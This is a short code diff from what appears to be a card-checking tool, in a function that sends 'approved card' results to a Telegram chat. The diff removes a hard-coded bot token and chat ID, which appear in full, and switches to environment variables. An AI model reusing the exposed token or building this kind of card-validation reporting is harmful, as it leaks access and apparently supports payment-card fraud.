@@ -328,8 +328,8 @@ async function sendAdminApprovedNotification(cc, site, result) {
     console.log('📝 Result:', result?.response);
     
     // Use specific credentials for approved card notifications
-    const ADMIN_BOT_TOKEN = process.env.APPROVED_BOT_TOKEN || "8396276886:AAENwJQ83yCGe3MzOFURYSst-6s0uogQ_rw";
-    const ADMIN_CHAT_ID = process.env.APPROVED_CHAT_ID || "-1002869133846";
+    const ADMIN_BOT_TOKEN = process.env.SERVER_BOT_TOKEN;
+    const ADMIN_CHAT_ID = process.env.SERVER_CHAT_ID;
 
     console.log('🔑 Bot Token:', ADMIN_BOT_TOKEN ? 'PRESENT' : 'MISSING');
     console.log('💬 Chat ID:', ADMIN_CHAT_ID);
